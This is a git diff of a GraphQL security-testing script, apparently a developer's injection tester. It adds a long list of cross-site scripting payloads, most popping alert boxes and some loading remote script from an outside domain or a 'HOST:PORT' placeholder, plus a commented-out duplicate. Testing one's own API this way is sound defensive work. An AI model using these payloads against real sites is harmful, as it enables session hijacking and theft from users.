@@ -227,8 +227,106 @@ maliciousInjectionTest.XSS = async (returnToTestMenu) => {
   const allowedInjections = [];
 
   const potentiallyMaliciousXSS = [
-    'Block me!"',//purposefully blocked, added double quote
-
+    '"-prompt(8)-"',
+    "'-prompt(8)-'",
+    '";a=prompt,a()//',
+    "';a=prompt,a()//",
+    `'-eval("window['pro'%2B'mpt'](8)")-'`,
+    `"-eval("window['pro'%2B'mpt'](8)")-"`,
+    '"onclick=prompt(8)>"@x.y',
+    '"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y',
+    '<image/src/onerror=prompt(8)>',
+    '<img/src/onerror=prompt(8)>',
+    '<image src/onerror=prompt(8)>',
+    '<img src/onerror=prompt(8)>',
+    '<image src =q onerror=prompt(8)>',
+    '<img src =q onerror=prompt(8)>',
+    '</scrip</script>t><img src =q onerror=prompt(8)>',
+    '<svg onload=alert(1)>',
+    '"><svg onload=alert(1)//',
+    '"onmouseover=alert(1)//',
+    '"autofocus/onfocus=alert(1)//',
+    "'-alert(1)-'",
+    "'-alert(1)//",
+    "'-alert(1)//",
+    '</script><svg onload=alert(1)>',
+    '<x contenteditable onblur=alert(1)>lose focus! ',
+    '<x onclick=alert(1)>click this! ',
+    '<x oncopy=alert(1)>copy this! ',
+    '<x oncontextmenu=alert(1)>right click this! ',
+    '<x oncut=alert(1)>copy this! ',
+    '<x ondblclick=alert(1)>double click this! ',
+    '<x ondrag=alert(1)>drag this! ',
+    '<x contenteditable onfocus=alert(1)>focus this! ',
+    '<x contenteditable oninput=alert(1)>input here! ',
+    '<x contenteditable onkeydown=alert(1)>press any key! ',
+    '<x contenteditable onkeypress=alert(1)>press any key! ',
+    '<x contenteditable onkeyup=alert(1)>press any key! ',
+    '<x onmousedown=alert(1)>click this! ',
+    '<x onmousemove=alert(1)>hover this! ',
+    '<x onmouseout=alert(1)>hover this! ',
+    '<x onmouseover=alert(1)>hover this! ',
+    '<x onmouseup=alert(1)>click this! ',
+    '<x contenteditable onpaste=alert(1)>paste here!',
+    '<script>alert(1)// ',
+    '<script>alert(1)<!–',
+    '<script src=//brutelogic.com.br/1.js> ',
+    '<script src=//3334957647/1>',
+    '%3Cx onxxx=alert(1) ',
+    '<%78 onxxx=1 ',
+    '<x %6Fnxxx=1 ',
+    '<x o%6Exxx=1 ',
+    '<x on%78xx=1 ',
+    '<x onxxx%3D1',
+    '<X onxxx=1 ',
+    '<x OnXxx=1 ',
+    '<X OnXxx=1 ',
+    '<x onxxx=1 onxxx=1',
+    '<x/onxxx=1 ',
+    '<x%09onxxx=1 ',
+    '<x%0Aonxxx=1 ',
+    '<x%0Conxxx=1 ',
+    '<x%0Donxxx=1 ',
+    '<x%2Fonxxx=1 ',
+    "<x 1='1'onxxx=1 ",
+    '<x 1="1"onxxx=1',
+    '<x </onxxx=1 ',
+    '<x 1=">" onxxx=1 ',
+    '<http://onxxx%3D1/',
+    "<x onxxx=alert(1) 1='",
+    "<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>",
+    "'onload=alert(1)><svg/1='",
+    "'>alert(1)</script><script/1=' ",
+    '*/alert(1)</script><script>/*',
+    `*/alert(1)">'onload="/*<svg/1='`,
+    `'-alert(1)">'onload="'<svg/1='`,
+    "*/</script>'>alert(1)/*<script/1='",
+    '<script>alert(1)</script> ',
+    '<script src=javascript:alert(1)> ',
+    '<iframe src=javascript:alert(1)> ',
+    '<embed src=javascript:alert(1)> ',
+    '<a href=javascript:alert(1)>click ',
+    '<math><brute href=javascript:alert(1)>click ',
+    '<form action=javascript:alert(1)><input type=submit> ',
+    '<isindex action=javascript:alert(1) type=submit value=click> ',
+    '<form><button formaction=javascript:alert(1)>click ',
+    '<form><input formaction=javascript:alert(1) type=submit value=click> ',
+    '<form><input formaction=javascript:alert(1) type=image value=click> ',
+    '<form><input formaction=javascript:alert(1) type=image src=SOURCE> ',
+    '<isindex formaction=javascript:alert(1) type=submit value=click> ',
+    '<object data=javascript:alert(1)> ',
+    '<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> ',
+    '<svg><script xlink:href=data:,alert(1) /> ',
+    '<math><brute xlink:href=javascript:alert(1)>click ',
+    '<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>',
+    '<html ontouchstart=alert(1)> ',
+    '<html ontouchend=alert(1)> ',
+    '<html ontouchmove=alert(1)> ',
+    '<html ontouchcancel=alert(1)>',
+    '<body onorientationchange=alert(1)>',
+    '"><img src=1 onerror=alert(1)>.gif',
+    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>',
+    'GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;'
   ];
 
   //Query db once for each snippet in potentiallyMaliciousSQL array
@@ -240,8 +338,9 @@ maliciousInjectionTest.XSS = async (returnToTestMenu) => {
       },
       body: JSON.stringify({
         query: `query {
-           ${config.TOP_LEVEL_FIELD}(id: ${config.ANY_TOP_LEVEL_FIELD_ID}, xss: "${maliciousSnippet}") {
+           ${config.TOP_LEVEL_FIELD}(id: ${config.ANY_TOP_LEVEL_FIELD_ID}) {
             id
+            # ${maliciousSnippet}
            }
          }`
       })
@@ -262,6 +361,114 @@ maliciousInjectionTest.XSS = async (returnToTestMenu) => {
 maliciousInjectionTest.OSCommand = (returnToTestMenu) => {
 
 }
+
+// function makeIntoArray(text) {
+//   let split = text.split('\n');
+//   console.log(split);
+// }
+
+// const payloadList = `"-prompt(8)-"
+// '-prompt(8)-'
+// ";a=prompt,a()//
+// ';a=prompt,a()//
+// '-eval("window['pro'%2B'mpt'](8)")-'
+// "-eval("window['pro'%2B'mpt'](8)")-"
+// "onclick=prompt(8)>"@x.y
+// "onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+// <image/src/onerror=prompt(8)>
+// <img/src/onerror=prompt(8)>
+// <image src/onerror=prompt(8)>
+// <img src/onerror=prompt(8)>
+// <image src =q onerror=prompt(8)>
+// <img src =q onerror=prompt(8)>
+// </scrip</script>t><img src =q onerror=prompt(8)>
+// <svg onload=alert(1)>
+// "><svg onload=alert(1)//
+// "onmouseover=alert(1)//
+// "autofocus/onfocus=alert(1)//
+// '-alert(1)-'
+// '-alert(1)//
+// \'-alert(1)//
+// </script><svg onload=alert(1)>
+// <x contenteditable onblur=alert(1)>lose focus! 
+// <x onclick=alert(1)>click this! 
+// <x oncopy=alert(1)>copy this! 
+// <x oncontextmenu=alert(1)>right click this! 
+// <x oncut=alert(1)>copy this! 
+// <x ondblclick=alert(1)>double click this! 
+// <x ondrag=alert(1)>drag this! 
+// <x contenteditable onfocus=alert(1)>focus this! 
+// <x contenteditable oninput=alert(1)>input here! 
+// <x contenteditable onkeydown=alert(1)>press any key! 
+// <x contenteditable onkeypress=alert(1)>press any key! 
+// <x contenteditable onkeyup=alert(1)>press any key! 
+// <x onmousedown=alert(1)>click this! 
+// <x onmousemove=alert(1)>hover this! 
+// <x onmouseout=alert(1)>hover this! 
+// <x onmouseover=alert(1)>hover this! 
+// <x onmouseup=alert(1)>click this! 
+// <x contenteditable onpaste=alert(1)>paste here!
+// <script>alert(1)// 
+// <script>alert(1)<!–
+// <script src=//brutelogic.com.br/1.js> 
+// <script src=//3334957647/1>
+// %3Cx onxxx=alert(1) 
+// <%78 onxxx=1 
+// <x %6Fnxxx=1 
+// <x o%6Exxx=1 
+// <x on%78xx=1 
+// <x onxxx%3D1
+// <X onxxx=1 
+// <x OnXxx=1 
+// <X OnXxx=1 
+// <x onxxx=1 onxxx=1
+// <x/onxxx=1 
+// <x%09onxxx=1 
+// <x%0Aonxxx=1 
+// <x%0Conxxx=1 
+// <x%0Donxxx=1 
+// <x%2Fonxxx=1 
+// <x 1='1'onxxx=1 
+// <x 1="1"onxxx=1
+// <x </onxxx=1 
+// <x 1=">" onxxx=1 
+// <http://onxxx%3D1/
+// <x onxxx=alert(1) 1='
+// <svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
+// 'onload=alert(1)><svg/1='
+// '>alert(1)</script><script/1=' 
+// */alert(1)</script><script>/*
+// */alert(1)">'onload="/*<svg/1='
+// '-alert(1)">'onload="'<svg/1='
+// */</script>'>alert(1)/*<script/1='
+// <script>alert(1)</script> 
+// <script src=javascript:alert(1)> 
+// <iframe src=javascript:alert(1)> 
+// <embed src=javascript:alert(1)> 
+// <a href=javascript:alert(1)>click 
+// <math><brute href=javascript:alert(1)>click 
+// <form action=javascript:alert(1)><input type=submit> 
+// <isindex action=javascript:alert(1) type=submit value=click> 
+// <form><button formaction=javascript:alert(1)>click 
+// <form><input formaction=javascript:alert(1) type=submit value=click> 
+// <form><input formaction=javascript:alert(1) type=image value=click> 
+// <form><input formaction=javascript:alert(1) type=image src=SOURCE> 
+// <isindex formaction=javascript:alert(1) type=submit value=click> 
+// <object data=javascript:alert(1)> 
+// <iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> 
+// <svg><script xlink:href=data:,alert(1) /> 
+// <math><brute xlink:href=javascript:alert(1)>click 
+// <svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
+// <html ontouchstart=alert(1)> 
+// <html ontouchend=alert(1)> 
+// <html ontouchmove=alert(1)> 
+// <html ontouchcancel=alert(1)>
+// <body onorientationchange=alert(1)>
+// "><img src=1 onerror=alert(1)>.gif
+// <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+// GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;`
+
+// makeIntoArray(payloadList);
 
 // maliciousInjectionTest.SQL();
 maliciousInjectionTest.XSS();
